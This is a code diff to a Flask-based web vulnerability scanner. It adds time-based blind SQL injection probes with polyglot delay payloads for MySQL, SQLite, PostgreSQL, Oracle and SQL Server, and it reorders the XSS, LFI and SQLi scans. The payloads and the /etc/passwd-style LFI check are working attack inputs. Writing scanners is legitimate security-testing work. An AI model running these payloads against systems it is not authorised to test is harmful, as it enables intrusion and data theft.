@@ -3,6 +3,7 @@
 from flask import Flask, request, jsonify
 from ghost import Ghost
 import requests
+import datetime
 import re
 
 app     = Flask(__name__)
@@ -45,10 +46,10 @@ def scan_sql_error(vulns, url, fuzz):
 	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
 	content = requests.get(inject).text
 
-	if "Warning: SQLite3:" in content or "You have an error in your SQL syntax" in content:
+	if "SQLSTATE[HY000]" in content or "Warning: SQLite3:" in content or "You have an error in your SQL syntax" in content:
 		print "\t\t\033[93mSQLi Detected \033[0m for ", fuzz, " with the payload :", payload
 		vulns['sql']  += 1
-		vulns['list'] += 'SQLi|TYPE|'+inject+'|DELIMITER|'
+		vulns['list'] += 'E_SQLi|TYPE|'+inject+'|DELIMITER|'
 	else:
 		print "\t\t\033[94mSQLi Failed \033[0m for ", fuzz, " with the payload :", payload
 
@@ -58,12 +59,33 @@ Description: use a polyglot vector to detect a SQL injection based on the respon
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
 def scan_sql_blind_time(vulns, url, fuzz):
-	payload  = "SleEP(2) /*' || SLeeP(2) || '\" || SLEep(2) || \"*/" 
-	payload0 = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/"
-	# TODO
-	return
+	mysql_payload     = "SLEEP(4) /*' || SLEEP(4) || '\" || SLEEP(4) || \"*/"
+	sqlite_payload    = "substr(upper(hex(randomblob(55555555))),0,1) /*' || substr(upper(hex(randomblob(55555555))),0,1) || '\" || substr(upper(hex(randomblob(55555555))),0,1) || \"*/"
+	postgre_payload   = "(SELECT 55555555 FROM PG_SLEEP(4)) /*' || (SELECT 55555555 FROM PG_SLEEP(4)) || '\" || (SELECT 55555555 FROM PG_SLEEP(4)) || \"*/"
+	oracle_payload    = "DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) /*' || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || '\" || DBMS_PIPE.RECEIVE_MESSAGE(chr(65)||chr(65)||chr(65),5) || \"*/"
+	sqlserver_payload = "WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) /*' || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || '\" || WAITFOR DELAY chr(48)+chr(58)+chr(48)+chr(58)+chr(52) || \"*/"
+	payloads_name     = ["MySQL", "SQLite", "PostgreSQL", "OracleSQL", "SQL Server"]
+	payloads_list     = [mysql_payload, sqlite_payload, postgre_payload, oracle_payload, sqlserver_payload]
 
+	for payload,name in zip(payloads_list,payloads_name):
 
+		# Do a request and check the response time
+		inject  = url.replace(fuzz+"=", fuzz+"="+payload)
+		time1   = datetime.datetime.now()
+		content = requests.get(inject).text
+		time2   = datetime.datetime.now()
+		diff    = time2 - time1
+		diff    = (divmod(diff.days * 86400 + diff.seconds, 60))[1]
+
+		# Our payloads will force a delay of 4s at least.
+		if diff > 2:
+			print "\t\t\033[93mTime Based SQLi (", name ,") Detected \033[0m for ", fuzz, " with the payload :", sqlite_payload
+			vulns['sql']  += 1
+			vulns['list'] += 'B_SQLi|TYPE|'+inject+'|DELIMITER|'
+			return 
+
+		else:
+			print "\t\t\033[94mTime Based SQLi (", name ,") Failed \033[0m for ", fuzz, " with the payload :", payload
 
 """scan_lfi
 Description: will scan every parameter for LFI, checking for the common root:x:0:0
@@ -80,6 +102,7 @@ def scan_lfi(vulns, url, fuzz):
 		vulns['list'] += 'LFI|TYPE|'+inject+'|DELIMITER|'
 	else:
 		print "\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload, inject
+
 
 """ Route /ping
 Description: Simple ping implementation to check if the server is up via the extension
@@ -107,11 +130,12 @@ def index():
 
 		# Launch scans
 		for fuzz in matches:
+			print "\n---[ New parameter : "+fuzz+" ]---"
 			scan_xss(vulns, url, fuzz)
+			scan_lfi(vulns, url, fuzz)
 			scan_sql_error(vulns, url, fuzz)
 			scan_sql_blind_time(vulns, url, fuzz)
-			scan_lfi(vulns, url, fuzz)
-	
+
 	# Display results as a json
 	return jsonify(vulns)
 
